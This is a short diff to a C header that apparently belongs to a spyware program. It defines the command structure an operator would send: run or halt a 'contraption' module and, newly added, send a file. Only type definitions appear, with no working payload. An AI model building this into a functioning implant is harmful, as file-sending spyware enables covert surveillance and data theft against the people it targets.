@@ -4,6 +4,8 @@
 #ifndef CONTRAP_META_H
 #define CONTRAP_META_H
 
+typedef uint32_t contIdent_t;
+
 typedef enum WriteMod {
     OverWrite = 0,
     AppendMod,
@@ -27,12 +29,14 @@ typedef enum SpywareCmdType {
 
     RunContraption = 1,
     HaltContraption = 2,
-} SpywareCmdType;
+    SendFile = 3,
+} SpywareFuncType;
 
 
 typedef __attribute__((packed)) struct SpywareCmd {
-    SpywareCmdType cmdType;
-    uint32_t cmdLen;
-} SpywareCommand;
+    SpywareFuncType FuncType; // function to do: run contraption, send file, stop contraption
+    ContType type; // Contraption type
+    contIdent_t contIdentifier;
+} SpywareCmd;
 
 #endif
